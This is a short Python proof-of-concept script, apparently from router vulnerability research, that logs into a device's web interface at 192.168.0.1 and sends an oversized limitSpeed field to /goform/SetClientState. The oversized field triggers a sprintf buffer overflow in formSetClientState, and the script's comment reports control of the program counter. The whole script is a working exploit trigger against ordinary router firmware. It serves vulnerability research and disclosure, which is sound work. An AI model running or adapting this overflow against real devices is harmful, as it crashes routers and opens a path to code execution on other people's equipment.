#!/usr/bin/env python3

# series of bofs in formSetClientState - 0x470fdc, using sprintf to trigger bof in formSetClientState -> modify_add_pos_rule, crash with $pc = 0x61616161

import common

t = common.Tendown('192.168.0.1', '80', 'user', 'user')
t.login()
p = {'deviceId':'0', 'limitEn':'1','limitSpeed':'a'*0x360 }
t.post_request('/goform/SetClientState', p)
